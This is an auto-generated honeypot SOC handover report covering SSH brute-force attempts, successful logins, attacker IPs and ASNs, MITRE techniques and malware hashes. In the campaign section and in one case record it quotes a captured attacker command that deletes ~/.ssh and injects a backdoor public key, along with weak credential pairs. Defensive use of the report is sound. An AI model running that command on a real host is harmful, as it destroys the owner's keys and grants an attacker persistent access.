# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-21 |
| **Generated At** | 2026-03-21T10:24:48Z |
| **Shift Time** | 10:24 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **45** |
| Confirmed Threats | **37** |
| False Positives Filtered | **8** (17.8%) |
| Unique Attacker IPs | **28** |
| Countries of Origin | **18** |
| High Severity Cases | **6** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **39** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **25** |
| Unique Credential Pairs | **24** |
| Unique Usernames | **20** |
| Unique Passwords | **20** |
| Successful Auth Pairs | **6** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 6 |
| `default` | 1 |
| `luke` | 1 |
| `jake` | 1 |
| `training` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `1234` | 3 |
| `12345678` | 2 |
| `webmaster` | 2 |
| `password` | 2 |
| `default33` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `webmaster` | 2 |
| `default` | `default33` | 1 |
| `root` | `123456a` | 1 |
| `luke` | `12345678` | 1 |
| `jake` | `jake@123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123456a` | `112.25.140.211` | 2026-03-21T08:45:00 |
| `root` | `webmaster` | `103.48.161.42` | 2026-03-21T09:04:42 |
| `root` | `webmaster` | `45.182.5.98` | 2026-03-21T09:04:52 |
| `root` | `qq112233` | `112.120.171.95` | 2026-03-21T09:08:03 |
| `root` | `3245gs5662d34` | `112.120.171.95` | 2026-03-21T09:08:07 |
| `root` | `admin1234567` | `149.54.15.126` | 2026-03-21T10:05:26 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `112.120.171.95`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **28** |
| Unique ASNs | **25** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS12479` | Orange Espagne SA | 1 | HIGH |
| `AS56046` | China Mobile communications corporation | 1 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |
| `AS6789` | CRELCOM LLC | 1 | HIGH |
| `AS63526` | Systems Solutions & development Technologies Limited | 1 | HIGH |
| `AS3269` | Telecom Italia S.p.A. | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (6)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-6bffd4bf2ade

| Field | Detail |
|---|---|
| **Source IP** | `112.25.140[.]211` |
| **First Seen** | 2026-03-21 08:44 |
| **Last Seen** | 2026-03-21 08:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 08:44:57` | `cowrie.session.connect` |
| `2026-03-21 08:44:58` | `cowrie.client.version` |
| `2026-03-21 08:44:58` | `cowrie.client.kex` |
| `2026-03-21 08:45:00` | `cowrie.login.success` |
| `2026-03-21 08:45:00` | `cowrie.direct-tcpip.request` |
| `2026-03-21 08:45:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.25.140[.]211` to AbuseIPDB if not already reported
- [ ] Block `112.25.140[.]211` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71a59b7fd7a6

| Field | Detail |
|---|---|
| **Source IP** | `103.48.161[.]42` |
| **First Seen** | 2026-03-21 09:04 |
| **Last Seen** | 2026-03-21 09:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 09:04:40` | `cowrie.session.connect` |
| `2026-03-21 09:04:41` | `cowrie.client.version` |
| `2026-03-21 09:04:41` | `cowrie.client.kex` |
| `2026-03-21 09:04:42` | `cowrie.login.success` |
| `2026-03-21 09:04:43` | `cowrie.direct-tcpip.request` |
| `2026-03-21 09:04:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.48.161[.]42` to AbuseIPDB if not already reported
- [ ] Block `103.48.161[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccb04b1b0c22

| Field | Detail |
|---|---|
| **Source IP** | `45.182.5[.]98` |
| **First Seen** | 2026-03-21 09:04 |
| **Last Seen** | 2026-03-21 09:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 09:04:48` | `cowrie.session.connect` |
| `2026-03-21 09:04:49` | `cowrie.client.version` |
| `2026-03-21 09:04:49` | `cowrie.client.kex` |
| `2026-03-21 09:04:52` | `cowrie.login.success` |
| `2026-03-21 09:04:53` | `cowrie.direct-tcpip.request` |
| `2026-03-21 09:04:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.182.5[.]98` to AbuseIPDB if not already reported
- [ ] Block `45.182.5[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d8d1f3179ee

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-03-21 09:08 |
| **Last Seen** | 2026-03-21 09:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 09:08:02` | `cowrie.session.connect` |
| `2026-03-21 09:08:02` | `cowrie.client.version` |
| `2026-03-21 09:08:02` | `cowrie.client.kex` |
| `2026-03-21 09:08:03` | `cowrie.login.success` |
| `2026-03-21 09:08:03` | `cowrie.session.params` |
| `2026-03-21 09:08:03` | `cowrie.command.input` |
| `2026-03-21 09:08:03` | `cowrie.command.failed` |
| `2026-03-21 09:08:03` | `cowrie.log.closed` |
| `2026-03-21 09:08:04` | `cowrie.session.params` |
| `2026-03-21 09:08:04` | `cowrie.command.input` |
| `2026-03-21 09:08:04` | `cowrie.session.file_download` |
| `2026-03-21 09:08:04` | `cowrie.log.closed` |
| `2026-03-21 09:08:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c7b7dee99af

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-03-21 09:08 |
| **Last Seen** | 2026-03-21 09:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 09:08:06` | `cowrie.session.connect` |
| `2026-03-21 09:08:06` | `cowrie.client.version` |
| `2026-03-21 09:08:06` | `cowrie.client.kex` |
| `2026-03-21 09:08:07` | `cowrie.login.success` |
| `2026-03-21 09:08:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea514287f0f5

| Field | Detail |
|---|---|
| **Source IP** | `149.54.15[.]126` |
| **First Seen** | 2026-03-21 10:05 |
| **Last Seen** | 2026-03-21 10:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 10:05:24` | `cowrie.session.connect` |
| `2026-03-21 10:05:25` | `cowrie.client.version` |
| `2026-03-21 10:05:25` | `cowrie.client.kex` |
| `2026-03-21 10:05:26` | `cowrie.login.success` |
| `2026-03-21 10:05:27` | `cowrie.direct-tcpip.request` |
| `2026-03-21 10:05:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.54.15[.]126` to AbuseIPDB if not already reported
- [ ] Block `149.54.15[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `112.120.171[.]95` | **15** | 2026-03-21 08:47 | 2026-03-21 09:18 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `20.163.30[.]209` | **2** | 2026-03-21 09:44 | 2026-03-21 09:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.143[.]178` | 1 | 2026-03-21 08:46 | 2026-03-21 08:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `105.184.152[.]84` | 1 | 2026-03-21 10:07 | 2026-03-21 10:07 | 12s | 0 | `T1592` | 🟢 LOW |
| `110.37.0[.]74` | 1 | 2026-03-21 08:42 | 2026-03-21 08:42 | 14s | 0 | `T1592` | 🟢 LOW |
| `116.7.248[.]50` | 1 | 2026-03-21 09:43 | 2026-03-21 09:44 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.241.79[.]66` | 1 | 2026-03-21 09:31 | 2026-03-21 09:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `143.198.102[.]46` | 1 | 2026-03-21 10:12 | 2026-03-21 10:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `146.190.19[.]24` | 1 | 2026-03-21 10:12 | 2026-03-21 10:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `167.172.86[.]106` | 1 | 2026-03-21 08:46 | 2026-03-21 08:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.78.28[.]55` | 1 | 2026-03-21 08:32 | 2026-03-21 08:32 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.148[.]190` | 1 | 2026-03-21 10:10 | 2026-03-21 10:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `197.251.249[.]75` | 1 | 2026-03-21 09:11 | 2026-03-21 09:11 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.153[.]55` | 1 | 2026-03-21 10:03 | 2026-03-21 10:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.245.122[.]57` | 1 | 2026-03-21 09:06 | 2026-03-21 09:06 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `85.50.0[.]15` | 1 | 2026-03-21 10:22 | 2026-03-21 10:22 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (10 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `49.124.153[.]55` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 16 |
| `197.251.249[.]75` | GH | Ghana Telecommunications Company Limited | **100** ⚠️ | 14 |
| `45.182.5[.]98` | BR | INOVA GUARUS TELECOM LTDA | **100** ⚠️ | 28 |
| `183.171.148[.]190` | MY | Celcom Axiata Berhad | **100** ⚠️ | 11 |
| `80.245.122[.]57` | UA | CRELCOM LLC | **100** ⚠️ | 4 |
| `143.198.102[.]46` | US | DigitalOcean, LLC | **100** ⚠️ | 7 |
| `178.78.28[.]55` | RU | JSC ER-Telecom Holding Krasnodar branch | **100** ⚠️ | 7 |
| `112.120.171[.]95` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 34 |
| `116.7.248[.]50` | CN | CHINANET Guangdong province network | **100** ⚠️ | 45 |
| `85.50.0[.]15` | ES | Orange Espagne SA | **100** ⚠️ | 9 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 27 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 19 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 6 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (8 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 45 cases |
| Tool 34  | Credential Extractor        | ✅ 25 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 28 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 8 filtered (17.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 25 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 10 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 6 priority case(s) shown individually · 16 recon entry/entries in table (2 group(s) consolidating 17 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-21T10:24:48Z_
